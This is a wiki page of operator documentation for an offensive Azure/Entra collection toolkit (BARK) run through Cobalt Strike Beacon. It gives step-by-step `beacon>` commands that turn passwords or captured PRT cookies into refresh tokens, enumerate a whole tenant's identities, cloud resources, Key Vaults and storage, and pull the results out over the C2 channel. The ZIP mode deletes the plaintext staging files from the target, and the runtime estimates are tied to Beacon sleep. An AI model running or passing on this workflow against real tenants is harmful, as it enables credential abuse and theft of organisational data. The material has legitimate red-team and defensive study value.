# Beacon collection workflow

[English](Collection-Workflow.md) | [日本語](ja/Collection-Workflow.md)

[Wiki home](Home.md) | [Operator workflow](../README.md)

### Operator fast path: refresh token to full collection

The shortest workflow is to obtain one refresh token and pass it to
`bark_get_all_info_bh_rt`. It caches access tokens by exact OAuth audience and
reuses them across each collection phase for up to 45 minutes. A cache miss
exchanges the refresh token and preserves any rotated refresh token for later
exchanges. The normal MS Graph path therefore uses three discovery token
exchanges (MS Graph, legacy AAD Graph for Conditional Access, and ARM) instead
of one exchange per collector. The final data-plane probe reuses those cached
discovery tokens and acquires only storage- and Key Vault-scoped tokens.

**1. Obtain a refresh token**

If you already have a refresh token, skip to step 2. With credentials that
are eligible for ROPC, request a Graph token with `offline_access`; BARK adds
that scope automatically and prints the returned refresh token:

```
beacon> bark_get_tokens_with_up <tenantId> <username> <password> https://graph.microsoft.com
...
[+] refresh_token: <refreshToken>
```

The command auto-tries the six known client IDs when its optional `clientId`
is omitted. ROPC does not work when MFA, Conditional Access, or another
interactive authentication requirement blocks the password grant.

The dedicated refresh-token command is also available when you already know
which client ID to use:

```
beacon> bark_get_entra_refresh_token_with_up <tenantId> <username> <password> <clientId>
```

**PRT-cookie alternative**

If you have a valid PRT cookie (`x-ms-RefreshTokenCredential` JWT), exchange
it through the Graph authorization-code flow. With no optional `clientId`,
BARK auto-tries the six known clients and uses the native-client redirect URI:

```
beacon> bark_get_token_with_prt_cookie <prtCookie> https://graph.microsoft.com <tenantId>
...
[+] refresh_token: <refreshToken>
```

When the token endpoint returns a refresh token, copy the value following
`[+] refresh_token:` and continue with step 2. If only an access token is
returned, it cannot be used with `bark_get_all_info_bh_rt`; retry with the
appropriate optional `clientId` and `redirectUri` for the captured PRT:

```
beacon> bark_get_token_with_prt_cookie <prtCookie> https://graph.microsoft.com <tenantId> <clientId> <redirectUri>
```

**2. Run the complete diskless workflow**

Copy the value following `[+] refresh_token:` and supply it as the second
argument:

```
beacon> bark_get_all_info_bh_rt <tenantId> <refreshToken>
```

Download mode is ON when `bark.cna` loads, so this downloads the BloodHound
JSON results individually through C2. The
data-plane discovery and probes run in memory and do not depend on those
files being present on the target.

Every start and terminal notice includes both the Beacon ID and a unique
all-info job ID so concurrent collections remain distinguishable.

**3. Or download one password-protected ZIP**

```
beacon> bark_download_mode off
beacon> bark_get_all_info_bh_rt <tenantId> <refreshToken> MyStrongPassword!
```

In ZIP mode, JSON is temporarily staged on the target so it can be bundled.
The storage and Key Vault probes run before the ZIP step; the final ZIP is
downloaded through C2 and the plaintext `AZ*.json` files are deleted. The
encrypted ZIP never touches target disk; large archives are sent as multiple
in-memory BeaconDownload chunks even though staging mode is OFF. The operator receives files named
`bark_collect_*.zip.part000`, `.part001`, and so on; reassemble them locally
before extracting.

If MS Graph is unavailable or a Graph BH request reports an error during
collection, the combined command immediately queues the legacy AAD Graph
identity collector before continuing to ARM and data-plane work.
Operators can force that path from the start with:

```
beacon> bark_get_all_info_legacy_bh <tenantId> <refreshToken> [password]
```

### Umbrella collectors

Once you have tokens, the umbrella collectors run many `*_bh` BOFs in
sequence for one-shot BloodHound captures:

| Command | Resource | Chains |
|---|---|---|
| `bark_get_entra_info_bh` | `https://graph.microsoft.com` | tenant info, users, groups, members, owners, devices, device owners, role definitions and assignments, apps, app-role assignments, app owners, app federated identity credentials, SPs, SP owners |
| `bark_get_entra_info_legacy_bh` | `https://graph.windows.net` | same shape as `_bh`, but against the legacy Azure AD Graph endpoint |
| `bark_get_azurerm_info_bh` | `https://management.azure.com` | subscriptions, resource groups, resources, VMs, VM scale sets, key vaults, storage accounts, logic/function/web apps, AKS, ACR, automation, container apps, container instances, Cosmos DB, role definitions, and their role assignments |

```
beacon> bark_get_entra_info_bh         <msgraph_token> [password]
beacon> bark_get_entra_info_legacy_bh  <aadgraph_token> [password]
beacon> bark_get_azurerm_info_bh       <arm_token> [password]
```

With `bark_download_mode off`, the optional trailing `password` argument
automatically chains `bark_zip_collect` to bundle all output into a
password-protected ZIP. While download mode is ON, BARK ignores the password
to preserve diskless operation (see
[Password-protected ZIP collection](Downloads-and-Archives.md#password-protected-zip-collection)).

Refresh-token variants perform the resource-token exchange for you:

```
beacon> bark_get_entra_info_bh_rt        <tenantId> <refreshToken> [password]
beacon> bark_get_entra_info_legacy_bh_rt <tenantId> <refreshToken> [password]
beacon> bark_get_azurerm_info_bh_rt      <tenantId> <refreshToken> [password]
beacon> bark_get_all_info_bh_rt          <tenantId> <refreshToken> [password]
beacon> bark_get_all_info_legacy_bh      <tenantId> <refreshToken> [password]
```

The exchange tries the six well-known first-party client IDs. Only one
refresh-token umbrella job may be pending per beacon. The pending state is
cleared automatically when all-info reaches a terminal state. Loading or
reloading `bark.cna` also starts with empty workflow maps, so the first RT
command should not require cleanup. Use `bark_clear_rt_pending` only to recover
a genuinely interrupted job. A silent watchdog clears workflow state after 60
minutes without Beacon check-in, output, error, or download activity; it does
not print recurring heartbeat messages. Starting another protected workflow
also performs this stale-state check immediately.
When collections overlap across Beacons, copy the job ID from the start notice
and run `bark_clear_rt_pending <allInfoJobId>` in that Beacon's console. BARK refuses
to clear the state if the supplied ID does not match the active run.

`bark_get_all_info_bh_rt` is the combined workflow. It runs the complete
Entra BloodHound collector, Conditional Access collector, and Azure RM
collector using one reusable access token per audience phase. It refreshes
only when the workflow changes token audiences (MS Graph, legacy Graph, or
Azure RM), or when a same-audience retry reaches the 45-minute cache boundary.
An audience change always requires its own scoped token. Independent
relationship families use worker threads inside their BOF, while Beacon's
per-Beacon inline task queue remains ordered. ARM reuses one subscription
snapshot across all resource families and passes the validated generic-resource
snapshot to the final RBAC collector. Invalid or oversized snapshots trigger
complete live discovery with pagination. Because the combined ARM COFF object
is too large for reliable in-process loading, each of the 17 resource collectors
runs in its own return-gated Beacon check-in; the two RBAC collectors use the
same staging. This retains the request-saving optimization while bounding every
ARM task and loader allocation to one collector. It then queues the
self-contained storage and Key Vault data-plane probe with the cached discovery
tokens. Download mode is ON by default, so all BH results are diskless C2
downloads. To create one encrypted archive, first run `bark_download_mode off`,
then pass a password. Results are staged temporarily, the probe runs before
cleanup, and one `bark_collect_all_*.zip` is produced after all collection
and probing tasks finish; the plaintext `AZ*.json` files are then deleted.
If a password is supplied while download mode is ON, BARK warns and ignores
it rather than silently writing JSON to the target.
In diskless mode, run `bark_convert_az_role_assignments_to_graph_bh` after
the downloads finish if you also want the derived Azure role graph file.

If the initial MS Graph token exchange fails, or a queued MS Graph collector
reports an error, `bark_get_all_info_bh_rt`
automatically switches to the legacy AAD Graph collector before it continues
with ARM and data-plane probing. To select legacy collection from the start,
run:

```
beacon> bark_get_all_info_legacy_bh <tenantId> <refreshToken> [password]
```

The legacy path requires the refresh token to be exchangeable for
`https://graph.windows.net`; it includes Conditional Access policy analysis
in the identity queue. Partial MS Graph results may still be present
when fallback was triggered after some Graph sub-BOFs had already completed.

```
# Fully diskless (default): each BH result is downloaded separately
beacon> bark_get_all_info_bh_rt <tenantId> <refreshToken>

# Single downloaded ZIP: JSON is staged temporarily, then deleted
beacon> bark_download_mode off
beacon> bark_get_all_info_bh_rt <tenantId> <refreshToken> MyStrongPassword!
```

### Expected runtime for `bark_get_all_info_bh_rt`

There is no fixed runtime. The important count is not only the number of
objects returned: several relationship collectors make one request for every
parent object even when that parent has no relationships. The workflow also
return-gates 15 Entra collectors and 21 Azure RM collectors, so the Beacon
sleep interval contributes directly to elapsed time.

The following planning ranges assume the MS Graph path succeeds without
legacy fallback, no HTTP 429 responses occur, Azure round-trip latency is
roughly 100--300 ms, `bark_download_mode` is on, and the Beacon sleep interval
is at most one second. `ARSP` means service principals that expose one or more
app roles; `Resources` means entries in the generic ARM resource inventory.

| Tenant profile | Users | Groups | Devices | Apps | Service principals | ARSP | Subscriptions | Resources | Expected time |
| --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: |
| Reference lab | 101 | 37 | 10 | 57 | 679 | 99 | 1 | 1 | about 4--6 minutes |
| Small | up to 1,000 | up to 100 | up to 100 | up to 100 | up to 1,000 | up to 150 | 1--3 | up to 1,000 | about 7--20 minutes |
| Medium | up to 10,000 | up to 1,000 | up to 2,000 | up to 1,000 | up to 10,000 | up to 1,500 | up to 20 | up to 10,000 | about 1--3 hours |
| Large | up to 50,000 | up to 5,000 | up to 20,000 | up to 5,000 | up to 50,000 | up to 7,500 | up to 100 | up to 50,000 | about 5--15 hours or more |

The reference-lab range is anchored to a current test run: the first Entra
output and final ARM collector output were 3 minutes 51 seconds apart. The
range allows for the initial token exchange, role-graph conversion, data-plane
probe, and C2 download completion. It is a sizing example, not a performance
guarantee.

For a count-based estimate, first calculate the request-driving terms:

```text
GraphParentRequests = 2 * Groups
                    + Devices
                    + 2 * Apps
                    + ServicePrincipals
                    + ARSP

ArmRequests ~= Resources + 22 * Subscriptions + 8 * ManagementGroups + 3

ProbeRequests ~= StorageAccounts + KeyVaults
               + 2 * Subscriptions
               + 2 * AppListPages
               + 2 * ServicePrincipalListPages
```

The two group passes are members and owners; the two app passes are owners and
federated identity credentials. Every service principal gets an owner request,
and every ARSP gets an `appRoleAssignedTo` request. If the ARSP count is not
known, use 15% of the service-principal count for a rough estimate or 100% for
a conservative upper bound. `ArmRequests` is an approximation before
pagination. `ManagementGroups` is the number of management-group parents
discovered by the authorization collectors. The management-group term covers
role assignments, descendants, role definitions, deny assignments, and four
PIM schedule/policy families. The final constant represents the subscription
list and the two independently executed management-group parent lists.

With the assumptions above, a practical first-pass calculation is:

```text
HTTP time in seconds ~= (0.12 to 0.30) * GraphParentRequests
                     + (0.15 to 0.50) * ArmRequests
                     + (0.15 to 1.00) * ProbeRequests
```

Add 20--90 seconds for token exchanges and fixed setup, then add output
transfer or ZIP time and C2 scheduling time. There are approximately 38--40
return-gated transitions in a successful run. Relative to a one-second Beacon
sleep, a five-second sleep can add roughly 2.5 minutes, a 30-second sleep
roughly 18 minutes, and a 60-second sleep roughly 37 minutes; jitter adds more.

Users, roles, role assignments, and relationship children primarily increase
list pagination and output size rather than per-parent request fan-out. A
parent with more than 999 members or owners adds continuation requests. HTTP
429 responses are excluded from all ranges: add the reported `Retry-After`
delays, and allow additional time because BARK adaptively increases request
pacing after a 429. Relationship completion lines report `parents`,
`childRequests`, `attempts`, `retries`, and `429`, which are the best inputs for
revising an estimate for a specific tenant.
